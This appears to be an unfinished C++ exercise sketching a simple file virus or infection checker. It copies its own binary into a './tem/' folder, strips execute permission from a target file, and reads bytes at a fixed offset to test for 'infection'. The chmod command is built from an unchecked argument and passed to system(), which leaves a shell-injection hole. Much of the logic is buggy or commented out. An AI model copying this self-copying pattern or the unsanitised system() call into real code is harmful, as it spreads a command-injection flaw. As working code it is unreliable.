
#include <bits/stdc++.h>
#include <iostream>
#include <sys/stat.h>
#include <sys/types.h>
#include <fstream>
#include <string>
#include <stdlib.h>
#include <filesystem>

using namespace std;

bool is_file_exist(std::string fileName);
bool can_create_directory(std::string directory);
void copy_binary(std::string host, std::string folder);
bool check_write_access(std::string fileName);
void modify_execute_access(std::string fileName);
int get_file_size(std::string fileName);
bool is_file_infected(std::string fileName);

int main(int argc, char** argv) {
    std::string fileName;
    std::string hostName = argv[0];
    std::string folder = "./tem/";
    
    if(can_create_directory(folder)){
      copy_binary(hostName.substr(2), folder);
    }
    
    if(argc > 1){
      fileName = argv[1];
    }
    else{
      fileName = "";
    }
    //if(check_write_access(fileName)){
      modify_execute_access(fileName);
      get_file_size(fileName);
      is_file_infected(fileName);
    //}
    return 0;
}

bool is_file_infected(std::string fileName){
  std::string virusName = "virus";
  int virusSize = get_file_size(virusName);
  virusSize = 4;
  const char*fName  = fileName.c_str();
  ifstream myFile (fileName, ios::in | ios::binary);
  myFile.seekg(virusSize);
  char arr[4];
  myFile.read(arr, 4);
  int i = 0;
  while(i < 4){
    cout<<arr[i]<<endl;
    i++;
  }
  myFile.close();
  return false;
  /*FILE * pFile;
  pFile = fopen ( fName , "rb" );
  /*fseek ( pFile , virusSize , SEEK_SET );
  int arr[4];
  int i = 0;
  while(i < 4){
    arr[i] = fgetc(pFile);
    cout<<arr[i];
    i++;
  }
  fclose(pFile);
  return false;*/
}

int get_file_size(std::string fileName){
  return std::filesystem::file_size(fileName);
}

/*bool check_write_access(std::string fileName){
  if(is_file_exist(fileName)){
    const char* file = fileName.c_str();
    FILE *fp = fopen(file, "w");
    if(fp != NULL){
      fclose(fp);
      return true;
    }
  }
  return false;
}*/

void modify_execute_access(std::string fileName){
    std::string cmdBuilder = fileName;
    cmdBuilder.insert(0, "chmod ugo-x ");
    const char*command  = cmdBuilder.c_str();
    cout << command << endl;
    system(command);
}

void copy_binary(std::string host, std::string folder){
    std::string hostSrc = host.substr(2);
    std::string hostDest = host.substr(2);
    hostDest.insert(0, folder);
    std::ifstream src(hostSrc, std::ios::binary);
    std::ofstream dst(hostDest, std::ios::binary);
    dst << src.rdbuf();
}



bool can_create_directory(std::string directory){
  const char* dir = directory.c_str();
  int check = mkdir(dir, 0777);
    if(check == -1){
      return false;
    }
    return true;
}

bool is_file_exist(std::string fileName)
{
    std::ifstream ifile;
    ifile.open(fileName);
    if(ifile) {
      return true;
    } else {
      return false;
    }
}
